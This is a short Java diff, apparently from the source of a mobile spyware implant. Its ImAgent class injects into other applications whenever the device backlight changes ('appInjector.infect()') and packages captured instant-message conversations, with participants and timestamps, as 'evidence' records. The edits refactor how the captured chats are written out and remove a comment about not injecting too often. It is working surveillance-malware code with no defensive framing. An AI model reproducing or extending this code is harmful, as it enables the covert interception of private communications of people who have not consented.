@@ -189,7 +189,6 @@ public final class ImAgent extends Agent implements BacklightObserver,
             debug.info("onBacklightChange, injecting");
             //#endif
 
-            //TODO: non fare troppo spesso. :-)
             appInjector.infect();
 
         }
@@ -294,8 +293,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         String users = partecipants;
 
         DateTime datetime = new DateTime();
-        evidence.createEvidence(null);
-        final Vector items = new Vector();
+                final Vector items = new Vector();
 
         for (int i = startFrom; i < lines.size(); i++) {
 
@@ -309,8 +307,8 @@ public final class ImAgent extends Agent implements BacklightObserver,
             items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
         }
 
-        evidence.writeEvidences(items);
-        evidence.close();
+        evidence.atomicWriteOnce(items);
+        
     }
 
 }
